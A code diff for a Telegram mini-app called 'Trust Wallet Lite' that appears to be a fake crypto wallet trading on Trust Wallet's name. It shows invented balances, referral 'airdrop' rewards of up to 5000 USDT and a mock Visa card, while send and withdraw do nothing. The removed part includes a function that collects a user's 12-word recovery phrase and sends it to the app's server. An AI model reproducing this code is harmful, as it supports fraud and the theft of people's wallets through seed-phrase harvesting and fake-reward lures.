@@ -1,112 +1,77 @@
 // ============================================================================
-// TRUST WALLET LITE - ULTIMATE PROFESSIONAL VERSION 6.3 (FULLY FIXED)
+// TRUST WALLET LITE - REFI STYLE (WORKING WITH RENDER)
 // ============================================================================
 
-// ====== 1. TELEGRAM WEBAPP INITIALIZATION (FIXED) ======
-let tg = null;
-let REAL_USER_ID = null;
-let TELEGRAM_USERNAME = '';
-let TELEGRAM_FIRST_NAME = 'User';
-let TELEGRAM_LAST_NAME = '';
-let TELEGRAM_PHOTO = '';
-let startParam = null;
+// ====== 1. TELEGRAM WEBAPP INITIALIZATION (مثل REFI بالضبط) ======
+const tg = window.Telegram?.WebApp;
+if (tg) {
+    tg.ready();
+    tg.expand();
+    tg.enableClosingConfirmation?.();
+    console.log("✅ Telegram WebApp initialized");
+}
 
-try {
-    // محاولة الوصول إلى Telegram WebApp
-    if (window.Telegram && window.Telegram.WebApp) {
-        tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-        console.log("✅ Telegram WebApp initialized");
+// 🔥 السطر السحري من REFI - يعمل 100%
+const userId = tg?.initDataUnsafe?.user?.id?.toString() || 
+               localStorage.getItem('twt_user_id') || 
+               'guest_' + Math.random().toString(36).substr(2, 9);
+
+const userName = tg?.initDataUnsafe?.user?.first_name || 'TWT User';
+const userFirstName = tg?.initDataUnsafe?.user?.first_name || 'User';
+const userLastName = tg?.initDataUnsafe?.user?.last_name || '';
+const userUsername = tg?.initDataUnsafe?.user?.username || '';
+const userPhoto = tg?.initDataUnsafe?.user?.photo_url || '';
+
+localStorage.setItem('twt_user_id', userId);
+
+console.log("📱 User ID:", userId);
+console.log("👤 Name:", userName);
+
+const startParam = tg?.initDataUnsafe?.start_param || 
+                   new URLSearchParams(window.location.search).get('startapp') || 
+                   new URLSearchParams(window.location.search).get('ref');
+
+// ====== 2. ADMIN SYSTEM (مثل REFI) ======
+const ADMIN_ID = "1653918641";
+let isAdmin = userId === ADMIN_ID;
+
+function checkAdminAndAddCrown() {
+    if (!isAdmin) return;
+    
+    const addCrown = () => {
+        const header = document.querySelector('.header-actions');
+        if (!header) return false;
         
-        // محاولة استخراج بيانات المستخدم
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            const user = tg.initDataUnsafe.user;
-            if (user.id) {
-                REAL_USER_ID = user.id.toString();
-                TELEGRAM_USERNAME = user.username || '';
-                TELEGRAM_FIRST_NAME = user.first_name || 'User';
-                TELEGRAM_LAST_NAME = user.last_name || '';
-                TELEGRAM_PHOTO = user.photo_url || '';
-                console.log("✅ Telegram user detected! ID:", REAL_USER_ID);
-                console.log("👤 Name:", TELEGRAM_FIRST_NAME);
-                console.log("🔹 Username:", TELEGRAM_USERNAME);
-            } else {
-                console.log("⚠️ Telegram user object has no ID");
-            }
+        const existingCrown = document.getElementById('adminCrownBtn');
+        if (existingCrown) existingCrown.remove();
+        
+        const adminBtn = document.createElement('button');
+        adminBtn.id = 'adminCrownBtn';
+        adminBtn.className = 'icon-btn';
+        adminBtn.innerHTML = '<i class="fa-solid fa-crown" style="color: gold;"></i>';
+        adminBtn.onclick = showAdminPanel;
+        adminBtn.title = 'Admin Panel';
+        
+        const notifBtn = document.getElementById('notificationBtn');
+        if (notifBtn) {
+            header.insertBefore(adminBtn, notifBtn);
         } else {
-            console.log("⚠️ No initDataUnsafe.user available");
+            header.appendChild(adminBtn);
         }
         
-        // استخراج start_param
-        startParam = tg.initDataUnsafe?.start_param || null;
-    } else {
-        console.log("⚠️ window.Telegram.WebApp not available");
-    }
-} catch (error) {
-    console.error("❌ Error initializing Telegram WebApp:", error);
-}
-
-// إذا لم نتمكن من الحصول على ID من تيليجرام، نعرض خطأ
-if (!REAL_USER_ID) {
-    console.error("❌ CRITICAL: No Telegram ID found!");
-}
-
-// قراءة startParam من URL إذا لم يكن موجوداً
-if (!startParam) {
-    const urlParams = new URLSearchParams(window.location.search);
-    startParam = urlParams.get('startapp') || urlParams.get('ref') || null;
-}
-
-console.log("📱 Final Telegram ID:", REAL_USER_ID);
-console.log("👤 Username:", TELEGRAM_USERNAME);
-console.log("📛 Name:", TELEGRAM_FIRST_NAME);
-console.log("🔗 Start param:", startParam);
-
-// ====== 2. إظهار شاشة التحميل وإخفائها بعد التهيئة ======
-function hideSplashScreen() {
-    const splash = document.getElementById('splashScreen');
-    if (splash) {
-        splash.classList.add('hidden');
-        setTimeout(() => {
-            splash.style.display = 'none';
-        }, 500);
+        return true;
+    };
+    
+    if (!addCrown()) {
+        setTimeout(addCrown, 500);
     }
 }
 
-function showErrorAndRetry(message) {
-    const splash = document.getElementById('splashScreen');
-    if (splash) {
-        splash.innerHTML = `
-            <div style="text-align: center; padding: 20px;">
-                <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: #ff4444;"></i>
-                <h2 style="color: #ff4444;">Error</h2>
-                <p>${message}</p>
-                <p style="font-size: 12px; color: #888;">Please open the bot from Telegram and try again.</p>
-                <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #0088cc; border: none; border-radius: 10px; color: white;">Retry</button>
-            </div>
-        `;
-    }
-}
-
-// ====== 3. STATE MANAGEMENT ======
-let userData = null;
-let isAdmin = false;
-let adminId = null;
-let currentLanguage = localStorage.getItem('language') || 'en';
-let currentTheme = localStorage.getItem('theme') || 'light';
-let currentPage = 'wallet';
-let TWT_PRICE = 1.25;
-let livePrices = {};
-let unreadNotifications = 0;
-let currentAdminTab = 'deposits';
-let appInitialized = false;
-
-// ====== 4. CONSTANTS ======
+// ====== 3. CONSTANTS ======
 const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
 const AIRDROP_BONUS = 10;
 const REFERRAL_BONUS = 25;
-const SWAP_FEE_PERCENT = 0.003;
+const TWT_PRICE = 1.25;
 
 const ALL_ASSETS = [
     { symbol: 'TWT', name: 'Trust Wallet Token' },
@@ -134,16 +99,6 @@ const AIRDROP_MILESTONES = [
     { invites: 1000, reward: 5000, unit: 'USDT', icon: 'fa-diamond' }
 ];
 
-const WITHDRAW_FEES = {
-    TWT: 1, USDT: 0.16, BNB: 0.0005, BTC: 0.0002, ETH: 0.001,
-    SOL: 0.005, TRX: 1, ADA: 0.5, DOGE: 1, SHIB: 50000, PEPE: 500000, TON: 0.1
-};
-
-const WITHDRAW_MINIMUMS = {
-    TWT: 10, USDT: 10, BNB: 0.02, BTC: 0.0005, ETH: 0.005,
-    SOL: 0.12, TRX: 40, ADA: 10, DOGE: 50, SHIB: 500000, PEPE: 5000000, TON: 1
-};
-
 const CMC_ICONS = {
     TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
     USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
@@ -159,14 +114,12 @@ const CMC_ICONS = {
     TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
 };
 
-const CRYPTO_IDS = {
-    TWT: 'trust-wallet-token', USDT: 'tether', BNB: 'binancecoin',
-    BTC: 'bitcoin', ETH: 'ethereum', SOL: 'solana', TRX: 'tron',
-    ADA: 'cardano', DOGE: 'dogecoin', SHIB: 'shiba-inu',
-    PEPE: 'pepe', TON: 'the-open-network'
-};
-
-const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫'];
+// ====== 4. STATE ======
+let userData = null;
+let currentLanguage = localStorage.getItem('language') || 'en';
+let currentTheme = localStorage.getItem('theme') || 'light';
+let currentPage = 'wallet';
+let livePrices = {};
 
 // ====== 5. TRANSLATIONS ======
 const translations = {
@@ -177,15 +130,10 @@ const translations = {
         'actions.send': 'Send', 'actions.receive': 'Receive',
         'actions.swap': 'Swap', 'actions.history': 'History',
         'wallet.totalBalance': 'Total Balance',
-        'airdrop.totalInvites': 'Total Invites', 'airdrop.earned': 'USDT Earned',
-        'airdrop.yourLink': 'Your Invite Link', 'airdrop.milestones': 'Airdrop Milestones',
-        'card.balance': 'Card Balance', 'settings.language': 'Language',
-        'settings.theme': 'Theme', 'settings.logout': 'Logout',
-        'admin.title': 'Admin Panel', 'admin.users': 'User Management',
-        'admin.searchUser': 'Search User', 'admin.addBalance': 'Add Balance',
-        'admin.removeBalance': 'Remove Balance', 'admin.refresh': 'Refresh',
-        'error.insufficient': 'Insufficient balance', 'error.enterAmount': 'Enter valid amount',
-        'success.swapCompleted': 'Swap completed', 'success.referralCopied': 'Referral link copied'
+        'airdrop.totalInvites': 'Total Invites',
+        'airdrop.earned': 'USDT Earned',
+        'airdrop.yourLink': 'Your Invite Link',
+        'airdrop.milestones': 'Airdrop Milestones'
     },
     ar: {
         'nav.wallet': 'المحفظة', 'nav.airdrop': 'الإسقاط الجوي',
@@ -194,15 +142,10 @@ const translations = {
         'actions.send': 'إرسال', 'actions.receive': 'استلام',
         'actions.swap': 'تحويل', 'actions.history': 'السجل',
         'wallet.totalBalance': 'الرصيد الإجمالي',
-        'airdrop.totalInvites': 'إجمالي الدعوات', 'airdrop.earned': 'USDT المكتسبة',
-        'airdrop.yourLink': 'رابط الدعوة', 'airdrop.milestones': 'مراحل الإسقاط',
-        'card.balance': 'رصيد البطاقة', 'settings.language': 'اللغة',
-        'settings.theme': 'المظهر', 'settings.logout': 'تسجيل الخروج',
-        'admin.title': 'لوحة المشرف', 'admin.users': 'إدارة المستخدمين',
-        'admin.searchUser': 'بحث عن مستخدم', 'admin.addBalance': 'إضافة رصيد',
-        'admin.removeBalance': 'خصم رصيد', 'admin.refresh': 'تحديث',
-        'error.insufficient': 'رصيد غير كاف', 'error.enterAmount': 'أدخل مبلغ صحيح',
-        'success.swapCompleted': 'تم التحويل', 'success.referralCopied': 'تم نسخ الرابط'
+        'airdrop.totalInvites': 'إجمالي الدعوات',
+        'airdrop.earned': 'USDT المكتسبة',
+        'airdrop.yourLink': 'رابط الدعوة',
+        'airdrop.milestones': 'مراحل الإسقاط'
     }
 };
 
@@ -217,7 +160,6 @@ function getCurrencyIcon(symbol) {
 function formatBalance(balance, symbol) {
     if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
     if (symbol === 'USDT') return '$' + balance.toFixed(2);
-    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
     return balance.toFixed(4) + ' ' + symbol;
 }
 
@@ -269,15 +211,13 @@ function toggleTheme() {
     currentTheme = currentTheme === 'light' ? 'dark' : 'light';
     localStorage.setItem('theme', currentTheme);
     document.documentElement.setAttribute('data-theme', currentTheme);
-    const themeIcon = document.querySelector('#themeBtn i');
-    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
 }
 
 function initTheme() {
     document.documentElement.setAttribute('data-theme', currentTheme);
 }
 
-// ====== 7. API CALLS ======
+// ====== 7. API CALLS (لـ Render) ======
 async function apiCall(endpoint, method = 'GET', body = null) {
     const options = { method, headers: { 'Content-Type': 'application/json' } };
     if (body) options.body = JSON.stringify(body);
@@ -285,239 +225,44 @@ async function apiCall(endpoint, method = 'GET', body = null) {
     return response.json();
 }
 
-async function loadAdminId() {
-    try {
-        const response = await fetch('/api/config');
-        const config = await response.json();
-        adminId = config.adminId;
-        console.log("✅ Admin ID loaded:", adminId);
-        console.log("👤 Current user ID:", REAL_USER_ID);
-        
-        if (REAL_USER_ID && adminId) {
-            isAdmin = (REAL_USER_ID === adminId);
-            console.log("👑 Is Admin:", isAdmin);
-        }
-        
-        updateAdminCrown();
-        return config;
-    } catch (error) {
-        console.error("Failed to load admin ID:", error);
-        return null;
-    }
-}
-
-function updateAdminCrown() {
-    const crownBtn = document.getElementById('adminCrownBtn');
-    if (!crownBtn) {
-        console.log("⚠️ Crown button not found in DOM");
-        return;
-    }
-    
-    console.log("🔍 Updating crown button. isAdmin:", isAdmin);
-    
-    if (isAdmin) {
-        crownBtn.classList.remove('hidden');
-        crownBtn.style.display = 'flex';
-        console.log("👑 Crown button is now VISIBLE");
-    } else {
-        crownBtn.classList.add('hidden');
-        crownBtn.style.display = 'none';
-        console.log("👑 Crown button is now HIDDEN");
-    }
-}
-
-async function createUser(userId, userData) {
-    return apiCall('/users', 'POST', { userId, userData });
-}
-
-async function getUser(userId) {
-    return apiCall(`/users/${userId}`);
-}
-
-async function updateUser(userId, updates) {
-    return apiCall(`/users/${userId}`, 'PATCH', { updates });
-}
-
-async function processReferral(referrerId, newUserId) {
-    return apiCall('/referrals', 'POST', { referrerId, newUserId });
-}
-
-async function createDepositAddress(userId, currency) {
-    return apiCall('/deposit-address', 'POST', { userId, currency });
-}
-
-// ====== 8. PRICES ======
-async function fetchLivePrices() {
-    try {
-        const ids = Object.values(CRYPTO_IDS).join(',');
-        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
-        const data = await response.json();
-        for (const [symbol, id] of Object.entries(CRYPTO_IDS)) {
-            if (data[id]) {
-                livePrices[symbol] = { price: data[id].usd, change: data[id].usd_24h_change || 0 };
-            }
-        }
-        if (!livePrices.TWT) livePrices.TWT = { price: 1.25, change: 0 };
-        TWT_PRICE = livePrices.TWT.price;
-        if (currentPage === 'wallet') renderAssets();
-        updateTotalBalance();
-    } catch (error) {
-        console.error("Price fetch error:", error);
-    }
-}
-
-// ====== 9. USER DATA MANAGEMENT ======
-function getUserId() {
-    // الأولوية القصوى للمعرف الحقيقي من تيليجرام
-    if (REAL_USER_ID) {
-        console.log("✅ Using REAL Telegram ID:", REAL_USER_ID);
-        return REAL_USER_ID;
-    }
-    
-    // إذا لم يكن هناك معرف حقيقي، نستخدم المخزن
-    const savedId = localStorage.getItem('twt_user_id');
-    if (savedId) {
-        console.log("⚠️ Using saved ID (not real Telegram):", savedId);
-        return savedId;
-    }
-    
-    console.log("❌ No user ID available");
-    return null;
-}
-
 async function loadUserData() {
     try {
-        const userId = getUserId();
-        if (!userId) return false;
+        console.log("📂 Loading user data for:", userId);
         
-        const localData = localStorage.getItem(`user_${userId}`);
-        if (localData) {
-            userData = JSON.parse(localData);
-            updateUI();
-        }
+        const response = await apiCall(`/users/${userId}`);
         
-        const result = await getUser(userId);
-        if (result.success && result.data) {
-            userData = result.data;
+        if (response.success && response.data) {
+            userData = response.data;
             localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
-            updateUI();
-            return true;
+            console.log("✅ Data loaded from API");
+        } else {
+            const localData = localStorage.getItem(`user_${userId}`);
+            if (localData) {
+                userData = JSON.parse(localData);
+                console.log("✅ Using localStorage data");
+            } else {
+                await createNewUser();
+            }
         }
-        return false;
+        
+        updateUI();
+        checkAdminAndAddCrown();
+        
+        if (startParam && startParam !== userId) {
+            await processReferral(startParam);
+        }
+        
     } catch (error) {
-        console.error("Error loading user data:", error);
-        return false;
+        console.error("❌ Error loading user data:", error);
     }
 }
 
-function saveUserData() {
-    if (userData) {
-        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
-        updateUser(userData.userId, userData);
-    }
-}
-
-function updateTotalBalance() {
-    if (!userData) return;
-    let total = userData.balances.USDT || 0;
-    total += (userData.balances.TWT || 0) * TWT_PRICE;
-    const totalEl = document.getElementById('totalBalance');
-    if (totalEl) totalEl.textContent = '$' + total.toFixed(2);
-}
-
-function updateUI() {
-    if (currentPage === 'wallet') {
-        renderAssets();
-        updateTotalBalance();
-    }
-    if (currentPage === 'airdrop') renderAirdrop();
-    if (currentPage === 'settings') renderSettings();
-    updateUserDisplay();
-}
-
-function updateUserDisplay() {
-    const userNameEl = document.getElementById('userName');
-    const userIdEl = document.getElementById('userIdDisplay');
-    const userAvatarEl = document.getElementById('userAvatar');
-    
-    if (userNameEl && userData) {
-        userNameEl.textContent = userData.userName || TELEGRAM_FIRST_NAME;
-    }
-    if (userIdEl && userData) {
-        userIdEl.textContent = `ID: ${userData.userId?.slice(-8)}`;
-    }
-    if (userAvatarEl && userData) {
-        userAvatarEl.textContent = (userData.userName || TELEGRAM_FIRST_NAME).charAt(0).toUpperCase();
-    }
-}
-
-function addNotification(message) {
-    if (!userData) return;
-    if (!userData.notifications) userData.notifications = [];
-    userData.notifications.unshift({
-        id: Date.now().toString(),
-        message: message,
-        read: false,
-        timestamp: new Date().toISOString()
-    });
-    saveUserData();
-    showToast(message);
-}
-
-// ====== 10. ONBOARDING & WALLET CREATION ======
-function showMainApp() {
-    const onboarding = document.getElementById('onboardingScreen');
-    const mainContent = document.getElementById('mainContent');
-    if (onboarding) onboarding.style.display = 'none';
-    if (mainContent) mainContent.style.display = 'block';
-    showWallet();
-}
-
-function showOnboarding() {
-    const onboarding = document.getElementById('onboardingScreen');
-    const mainContent = document.getElementById('mainContent');
-    if (onboarding) onboarding.style.display = 'flex';
-    if (mainContent) mainContent.style.display = 'none';
-}
-
-async function createNewWallet() {
-    const btn = document.getElementById('createWalletBtn');
-    if (!btn) return;
-    
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
-    btn.disabled = true;
-    
+async function createNewUser() {
     try {
-        // 🔥 استخدام REAL_USER_ID مباشرة - لا نسمح بإنشاء مستخدمين وهميين
-        if (!REAL_USER_ID) {
-            showToast('Please open this app from Telegram!', 'error');
-            return;
-        }
-        
-        const newUserId = REAL_USER_ID;
-        localStorage.setItem('twt_user_id', newUserId);
-        
-        console.log("🎯 Creating wallet for Telegram ID:", newUserId);
-        
-        // توليد عنوان إيداع
-        let depositAddress = `0x${newUserId.slice(-40).padStart(40, '0')}`;
-        try {
-            const addressResult = await createDepositAddress(newUserId, 'USDT');
-            if (addressResult.address) depositAddress = addressResult.address;
-        } catch (e) {
-            console.log("Using fallback address");
-        }
-        
         const newUserData = {
-            userId: newUserId,
-            userName: TELEGRAM_FIRST_NAME,
-            username: TELEGRAM_USERNAME,
-            telegramId: REAL_USER_ID,
-            depositAddress: depositAddress,
-            balances: {
-                TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
-                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
-            },
+            userId: userId,
+            userName: userName,
+            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0 },
             inviteCount: 0,
             invitedBy: null,
             totalUsdtEarned: AIRDROP_BONUS,
@@ -528,111 +273,68 @@ async function createNewWallet() {
             createdAt: new Date().toISOString()
         };
         
-        await createUser(newUserId, newUserData);
-        userData = newUserData;
-        saveUserData();
+        const response = await apiCall('/users', 'POST', { userId, userData: newUserData });
         
-        isAdmin = (newUserId === adminId);
-        updateAdminCrown();
-        
-        if (startParam && startParam !== newUserId) {
-            await processReferral(startParam, newUserId);
+        if (response.success) {
+            userData = newUserData;
+            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
+            console.log("✅ New user created");
+            showToast('✅ Wallet created! +10 USDT');
         }
         
-        showMainApp();
-        updateUI();
-        showToast('✅ Wallet created! +10 USDT');
     } catch (error) {
-        console.error(error);
+        console.error("Error creating user:", error);
         showToast('Failed to create wallet', 'error');
-    } finally {
-        btn.innerHTML = 'Create a new wallet';
-        btn.disabled = false;
     }
 }
 
-function showImportModal() {
-    document.getElementById('importModal').classList.add('show');
-}
-
-async function importWallet() {
-    const words = [];
-    for (let i = 1; i <= 12; i++) {
-        const word = document.getElementById(`word_${i}`)?.value.trim();
-        if (!word) { showToast(`Enter word ${i}`, 'error'); return; }
-        words.push(word);
-    }
-    
-    const btn = document.getElementById('confirmImportBtn');
-    if (btn) {
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
-        btn.disabled = true;
-    }
-    
+async function processReferral(referralCode) {
     try {
-        if (!REAL_USER_ID) {
-            showToast('Please open this app from Telegram!', 'error');
-            return;
+        const response = await apiCall('/referrals', 'POST', { referrerId: referralCode, newUserId: userId });
+        if (response.success) {
+            console.log("✅ Referral processed");
         }
+    } catch (error) {
+        console.error("Referral error:", error);
+    }
+}
+
+function saveUserData() {
+    if (userData) {
+        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
+        apiCall(`/users/${userId}`, 'PATCH', { updates: userData });
+    }
+}
+
+// ====== 8. PRICES ======
+async function fetchLivePrices() {
+    try {
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=trust-wallet-token,tether,binancecoin,bitcoin,ethereum,solana,tron,cardano,dogecoin,shiba-inu,pepe,the-open-network&vs_currencies=usd');
+        const data = await response.json();
         
-        const newUserId = REAL_USER_ID;
-        localStorage.setItem('twt_user_id', newUserId);
-        
-        console.log("🎯 Importing wallet for Telegram ID:", newUserId);
-        
-        let depositAddress = `0x${newUserId.slice(-40).padStart(40, '0')}`;
-        try {
-            const addressResult = await createDepositAddress(newUserId, 'USDT');
-            if (addressResult.address) depositAddress = addressResult.address;
-        } catch (e) {}
-        
-        const newUserData = {
-            userId: newUserId,
-            userName: TELEGRAM_FIRST_NAME,
-            username: TELEGRAM_USERNAME,
-            recoveryPhrase: words.join(' '),
-            depositAddress: depositAddress,
-            balances: {
-                TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0,
-                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
-            },
-            inviteCount: 0,
-            invitedBy: null,
-            totalUsdtEarned: AIRDROP_BONUS,
-            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
-            notifications: [{ id: Date.now().toString(), message: '🎉 Wallet imported! +10 USDT', read: false, timestamp: new Date().toISOString() }],
-            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
-            withdrawBlocked: false,
-            createdAt: new Date().toISOString()
+        livePrices = {
+            TWT: { price: data['trust-wallet-token']?.usd || 1.25 },
+            USDT: { price: data.tether?.usd || 1 },
+            BNB: { price: data.binancecoin?.usd || 0 },
+            BTC: { price: data.bitcoin?.usd || 0 },
+            ETH: { price: data.ethereum?.usd || 0 },
+            SOL: { price: data.solana?.usd || 0 },
+            TRX: { price: data.tron?.usd || 0 },
+            ADA: { price: data.cardano?.usd || 0 },
+            DOGE: { price: data.dogecoin?.usd || 0 },
+            SHIB: { price: data['shiba-inu']?.usd || 0 },
+            PEPE: { price: data.pepe?.usd || 0 },
+            TON: { price: data['the-open-network']?.usd || 0 }
         };
         
-        await createUser(newUserId, newUserData);
-        userData = newUserData;
-        saveUserData();
-        
-        isAdmin = (newUserId === adminId);
-        updateAdminCrown();
-        
-        if (startParam && startParam !== newUserId) {
-            await processReferral(startParam, newUserId);
-        }
-        
-        closeModal('importModal');
-        showMainApp();
-        updateUI();
-        showToast('✅ Wallet imported! +10 USDT');
+        if (currentPage === 'wallet') renderAssets();
+        updateTotalBalance();
     } catch (error) {
-        console.error(error);
-        showToast('Failed to import wallet', 'error');
-    } finally {
-        if (btn) {
-            btn.innerHTML = 'Import Wallet';
-            btn.disabled = false;
-        }
+        console.error("Price fetch error:", error);
     }
 }
 
-// ====== 11. RENDER FUNCTIONS ======
+// ====== 9. RENDER FUNCTIONS ======
 function renderAssets() {
     const container = document.getElementById('assetsList');
     if (!container || !userData) return;
@@ -641,9 +343,6 @@ function renderAssets() {
         const balance = userData.balances[asset.symbol] || 0;
         const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
         const value = asset.symbol === 'USDT' ? balance : balance * price;
-        const change = livePrices[asset.symbol]?.change || 0;
-        const changeClass = change >= 0 ? 'positive' : 'negative';
-        const changeSymbol = change >= 0 ? '+' : '';
         
         return `
             <div class="asset-item">
@@ -651,7 +350,7 @@ function renderAssets() {
                     <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img">
                     <div class="asset-info">
                         <h4>${asset.name}</h4>
-                        <p>${asset.symbol} <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span></p>
+                        <p>${asset.symbol}</p>
                     </div>
                 </div>
                 <div class="asset-right">
@@ -684,11 +383,19 @@ function renderWallet() {
     updateTotalBalance();
 }
 
+function updateTotalBalance() {
+    if (!userData) return;
+    let total = userData.balances.USDT || 0;
+    total += (userData.balances.TWT || 0) * TWT_PRICE;
+    const totalEl = document.getElementById('totalBalance');
+    if (totalEl) totalEl.textContent = '$' + total.toFixed(2);
+}
+
 function renderAirdrop() {
     const container = document.getElementById('referralContainer');
     if (!container || !userData) return;
     
-    const inviteLink = `${BOT_LINK}?startapp=${userData.userId}`;
+    const inviteLink = `${BOT_LINK}?startapp=${userId}`;
     
     container.innerHTML = `
         <div class="referral-stats">
@@ -715,8 +422,8 @@ function renderAirdropMilestones() {
     
     container.innerHTML = AIRDROP_MILESTONES.map(m => {
         const progress = Math.min((userData.inviteCount / m.invites) * 100, 100);
-        const canClaim = userData.inviteCount >= m.invites && !userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
-        const isClaimed = userData.airdropMilestones.find(x => x.invites === m.invites)?.claimed;
+        const canClaim = userData.inviteCount >= m.invites && !userData.airdropMilestones?.find(x => x.invites === m.invites)?.claimed;
+        const isClaimed = userData.airdropMilestones?.find(x => x.invites === m.invites)?.claimed;
         
         return `
             <div class="milestone-item">
@@ -730,8 +437,8 @@ function renderAirdropMilestones() {
 }
 
 async function claimMilestone(invites) {
-    const m = userData.airdropMilestones.find(x => x.invites === invites);
-    if (!m || m.claimed) return;
+    const milestone = userData.airdropMilestones?.find(x => x.invites === invites);
+    if (!milestone || milestone.claimed) return;
     if (userData.inviteCount < invites) {
         showToast(`Need ${invites} invites`, 'error');
         return;
@@ -739,7 +446,7 @@ async function claimMilestone(invites) {
     const reward = AIRDROP_MILESTONES.find(x => x.invites === invites).reward;
     userData.balances.USDT = (userData.balances.USDT || 0) + reward;
     userData.totalUsdtEarned = (userData.totalUsdtEarned || 0) + reward;
-    m.claimed = true;
+    milestone.claimed = true;
     saveUserData();
     renderAirdrop();
     renderWallet();
@@ -748,40 +455,26 @@ async function claimMilestone(invites) {
 }
 
 function copyInviteLink() {
-    copyToClipboard(`${BOT_LINK}?startapp=${userData?.userId}`);
-    showToast(t('success.referralCopied'));
+    copyToClipboard(`${BOT_LINK}?startapp=${userId}`);
+    showToast('Referral link copied!');
 }
 
 function renderTWTPay() {
     const container = document.getElementById('twtpayContainer');
     if (!container) return;
     const twtBalance = userData?.balances?.TWT || 0;
-    const cardNumber = userData?.userId?.slice(-4) || '8888';
+    const cardNumber = userId?.slice(-4) || '8888';
     container.innerHTML = `
         <div class="virtual-card">
             <div class="card-chip"><i class="fas fa-microchip"></i></div>
             <div class="card-brand">TWT Pay</div>
             <div class="card-number"><span>****</span><span>****</span><span>****</span><span>${cardNumber}</span></div>
             <div class="card-details"><div><div class="label">Card Holder</div><div class="value">${userData?.userName || 'User'}</div></div><div><div class="label">Expires</div><div class="value">12/28</div></div></div>
-            <div class="card-balance"><div class="balance-label">${t('card.balance')}</div><div class="balance-value">${twtBalance} TWT</div><div class="balance-usd">≈ $${(twtBalance * TWT_PRICE).toFixed(2)}</div></div>
+            <div class="card-balance"><div class="balance-label">Card Balance</div><div class="balance-value">${twtBalance} TWT</div><div class="balance-usd">≈ $${(twtBalance * TWT_PRICE).toFixed(2)}</div></div>
             <div class="card-footer"><i class="fab fa-visa"></i><span>Virtual Card</span></div>
-        </div>
-        <div class="card-actions">
-            <button class="card-action-btn" onclick="showTopUp()"><i class="fas fa-plus-circle"></i><span>Top Up</span></button>
-            <button class="card-action-btn" onclick="showCardSettings()"><i class="fas fa-sliders-h"></i><span>Settings</span></button>
-            <button class="card-action-btn" onclick="showCardTransactions()"><i class="fas fa-history"></i><span>History</span></button>
-        </div>
-        <div class="card-features">
-            <div class="feature"><i class="fas fa-globe"></i><span>Global</span></div>
-            <div class="feature"><i class="fas fa-shield-alt"></i><span>Secure</span></div>
-            <div class="feature"><i class="fas fa-percent"></i><span>2% Cashback</span></div>
         </div>
     `;
 }
-
-function showTopUp() { showToast('Coming soon!'); }
-function showCardSettings() { showToast('Coming soon!'); }
-function showCardTransactions() { showHistory(); }
 
 function renderSettings() {
     const container = document.getElementById('settingsContainer');
@@ -841,6 +534,7 @@ function logout() {
     }
 }
 
+// ====== 10. MODAL FUNCTIONS ======
 function showSendModal() { document.getElementById('sendModal').classList.add('show'); }
 function showReceiveModal() { document.getElementById('receiveModal').classList.add('show'); }
 function showDepositModal() { document.getElementById('depositModal').classList.add('show'); }
@@ -850,7 +544,7 @@ function showSwapModal() { showToast('Coming soon!'); }
 function sendTransaction() { showToast('Coming soon!'); }
 function submitWithdraw() { showToast('Coming soon!'); }
 
-// ====== 12. NAVIGATION ======
+// ====== 11. NAVIGATION ======
 function showWallet() { 
     currentPage = 'wallet'; 
     document.getElementById('walletSection').classList.remove('hidden');
@@ -907,67 +601,56 @@ function showSettings() {
     renderSettings();
 }
 
-// ====== 13. ADMIN PANEL ======
+// ====== 12. ADMIN PANEL ======
 function showAdminPanel() {
     if (!isAdmin) { showToast('Access denied', 'error'); return; }
     alert('Admin Panel - Use the crown button 👑');
 }
 
+// ====== 13. UPDATE UI ======
+function updateUI() {
+    if (currentPage === 'wallet') {
+        renderAssets();
+        updateTotalBalance();
+    }
+    if (currentPage === 'airdrop') renderAirdrop();
+    if (currentPage === 'settings') renderSettings();
+    
+    const userNameEl = document.getElementById('userName');
+    if (userNameEl && userData) {
+        userNameEl.textContent = userData.userName || userName;
+    }
+    const userIdEl = document.getElementById('userIdDisplay');
+    if (userIdEl && userData) {
